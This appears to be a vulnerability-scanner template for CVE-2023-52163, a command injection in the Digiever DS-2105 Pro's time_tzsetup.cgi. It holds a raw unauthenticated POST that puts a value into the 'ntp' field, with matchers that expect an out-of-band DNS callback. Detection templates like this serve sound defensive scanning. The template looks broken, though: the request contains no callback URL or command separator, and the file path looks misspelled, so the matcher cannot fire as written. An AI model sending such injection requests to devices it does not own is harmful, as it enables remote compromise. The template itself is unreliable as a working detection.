id: CVE-2023-52163

info:
  name: Digiever DS-2105 Pro - Command Injection
  author: rajesh-social-tech
  severity: high
  description: |
    Digiever DS-2105 Pro 3.1.0.71-11 contains a command injection caused by unsanitized input in time_tzsetup.cgi, letting attackers execute arbitrary commands remotely, exploit requires no authentication.
  impact: |
    Remote attackers can execute arbitrary commands on the device, potentially leading to full device compromise.
  remediation: |
    Update to a supported version or contact the vendor for security patches.
  reference:
    - https://www.txone.com/blog/digiever-fixes-sorely-needed/
    - https://www.fortiguard.com/encyclopedia/ips/57266
    - https://github.com/advisories/GHSA-mrvx-3qrr-qqxw
  metadata:
    max-request: 1
  tags: cve,cve2023,digiever,rce,oast,kev,vkev

http:
  - raw:
      - |
        POST /cgi-bin/cgi_main.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cgiName=time_tzsetup.cgi&ntp=/etc/digigiver-release&action=4

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(interactsh_protocol,'dns')
          - contains(header, 'IE=EmulateIE10')
        condition: and
